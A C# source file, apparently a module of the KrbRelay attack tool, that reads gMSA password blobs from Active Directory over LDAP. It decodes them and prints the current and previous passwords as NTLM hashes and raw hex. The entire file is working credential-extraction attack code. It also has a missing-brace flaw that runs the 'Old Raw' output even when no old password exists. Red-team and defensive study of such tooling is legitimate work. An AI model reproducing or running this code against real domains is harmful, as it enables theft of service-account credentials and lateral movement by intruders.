using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace KrbRelay.Clients.Attacks.Ldap
{
    internal class gMSA
    {
        public static void read(IntPtr ld, string gMsaUser = "")
        {
            List<IntPtr> entries;
            if (string.IsNullOrEmpty(gMsaUser))
            {
                entries = Generic.GetObjects(ld, State.domainDN, "(&(objectClass=msDS-GroupManagedServiceAccount))", "msDS-ManagedPassword");
            }
            else
            {
                entries = Generic.GetObjects(ld, State.domainDN, "(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName={0}))", "msDS-ManagedPassword");
            }

            if (entries.Count == 0)
            {
                Console.WriteLine("[-] No gMSA entries");
                return;
            }

            foreach(var entry in entries)
            {
                string dn = Generic.GetDistinguishedName(ld, entry);

                IntPtr ber = IntPtr.Zero;
                Dictionary<string, List<byte[]>> aa = Generic.GetAttributes(ld, entry, ref ber);
                var managedPassword = new MsDsManagedPassword(
                    aa.Values.SelectMany(a => a).ToArray().SelectMany(a => a).ToArray()
                );

                Console.WriteLine("[+] Got gMSA:\n");
                Console.WriteLine("Username: {0}", dn);
                Console.WriteLine(
                    "PasswordGoodUntil: {0}",
                    managedPassword.PasswordGoodUntil.ToString()
                );
                Console.WriteLine(
                     "NTLM: {0}",
                     Helpers.KerberosPasswordHash(
                         KERB_ETYPE.rc4_hmac,
                         managedPassword.CurrentPassword
                     )
                 );
                Console.WriteLine(
                    "Raw: {0}",
                    Helpers.ByteArrayToHex(Encoding.Unicode.GetBytes(managedPassword.CurrentPassword))
                );

                if (managedPassword.OldPassword != null)
                    Console.WriteLine(
                        "Old NTLM: {0}",
                        Helpers.KerberosPasswordHash(
                            KERB_ETYPE.rc4_hmac,
                            managedPassword.OldPassword
                        )
                    );
                    Console.WriteLine(
                        "Old Raw: {0}",
                        Helpers.ByteArrayToHex(Encoding.Unicode.GetBytes(managedPassword.OldPassword))
                    );
                Console.WriteLine();
            }
            return;
        }
    }

    // https://github.com/rvazarkar/GMSAPasswordReader/blob/master/MsDsManagedPassword.cs
    internal class MsDsManagedPassword
    {
        internal short Version { get; set; }
        internal string CurrentPassword { get; set; }
        internal string OldPassword { get; set; }
        internal DateTime NextQueryTime { get; set; }
        internal DateTime PasswordGoodUntil { get; set; }

        internal MsDsManagedPassword(byte[] blob)
        {
            using (var stream = new MemoryStream(blob))
            {
                using (var reader = new BinaryReader(stream))
                {
                    Version = reader.ReadInt16();
                    reader.ReadInt16();

                    var length = reader.ReadInt32();

                    if (length != blob.Length)
                    {
                        throw new Exception("Missized blob");
                    }

                    var curPwdOffset = reader.ReadInt16();
                    CurrentPassword = GetUnicodeString(blob, curPwdOffset);

                    var oldPwdOffset = reader.ReadInt16();
                    if (oldPwdOffset > 0)
                    {
                        OldPassword = GetUnicodeString(blob, oldPwdOffset);
                    }

                    var queryPasswordIntervalOffset = reader.ReadInt16();
                    var queryPasswordIntervalTicks = BitConverter.ToInt64(
                        blob,
                        queryPasswordIntervalOffset
                    );
                    NextQueryTime = DateTime.Now + TimeSpan.FromTicks(queryPasswordIntervalTicks);

                    var unchangedPasswordIntervalOffset = reader.ReadInt16();
                    var unchangedPasswordIntervalTicks = BitConverter.ToInt64(
                        blob,
                        unchangedPasswordIntervalOffset
                    );
                    PasswordGoodUntil =
                        DateTime.Now + TimeSpan.FromTicks(unchangedPasswordIntervalTicks);
                }
            }
        }

        private string GetUnicodeString(byte[] blob, int index)
        {
            var stOut = "";

            for (var i = index; i < blob.Length; i += 2)
            {
                var ch = BitConverter.ToChar(blob, i);
                if (ch == char.MinValue)
                {
                    //found the end  .    A null-terminated WCHAR string
                    return stOut;
                }
                stOut += ch;
            }

            return null;
        }
    }
}
